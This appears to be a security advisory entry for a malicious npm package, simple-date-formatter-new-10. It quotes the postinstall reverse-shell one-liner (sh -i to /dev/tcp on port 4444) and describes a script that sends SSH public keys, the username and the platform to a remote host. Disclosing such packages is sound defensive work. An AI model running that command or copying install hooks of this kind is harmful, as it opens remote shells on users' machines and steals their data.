  "summary": "Malicious code in simple-date-formatter-new-10 (npm)",
  "details": "The postinstall hook opens an interactive reverse shell to 124[.]221[.]154[.]135:4444 (sh -i \u003e\u0026 /dev/tcp/124[.]221[.]154[.]135/4444 0\u003e\u00261). A bundled postinstall.js additionally reads the user's ~/.ssh/*.pub key files, collects the username and platform, and POSTs this data as JSON to hxxps://124[.]221[.]154[.]135/post. The package's main index.js is a trivial date-formatting function that serves as a decoy.",
